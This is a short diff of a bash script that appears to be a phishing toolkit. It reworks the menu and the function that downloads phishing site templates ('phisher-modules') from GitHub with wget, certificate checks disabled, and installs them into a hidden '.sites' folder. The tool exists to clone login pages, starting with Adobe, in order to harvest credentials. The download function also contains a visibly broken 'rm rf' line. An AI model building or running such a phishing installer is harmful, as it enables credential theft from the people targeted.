@@ -1493,7 +1493,7 @@ esac
 checksite_menu(){
 if [[ ! -d "${sites_dir}" ]]; then
         echo -e " "
-        echo -e "                                   ${BLUE} [X] ${GREEN}  Download all sites                                          ${NC}"
+        echo -e "               ${BLUE} [X] ${LBLUE}  Download all sites            ${NC}"
         echo -e " "
 else 
         echo -e " "
@@ -1507,12 +1507,14 @@ download_allsite(){
         wget --no-check-certificate https://github.com/Alygnt/phisher-modules/archive/refs/heads/sites.zip > /dev/null 2>&1
         sleep 1
         echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Unzipping Sites..."
-        unzip sites.zip
+        unzip -q sites.zip
         echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} Setting UP..."
-        mv sites ${pro_dir}
+        mv phisher-modules-sites ${pro_dir}
         rm rf sites.zip
-        mv sites .sites
+        mv phisher-modules-sites .sites
         echo -e "\n${BLUE}[${WHITE}+${BLUE}]${GREEN} SITES ARE DOWNLOADED SUCCESSFULLY..."
+        sleep 3
+        mainmenu
 }   
 #WEBSITES
 #adobe
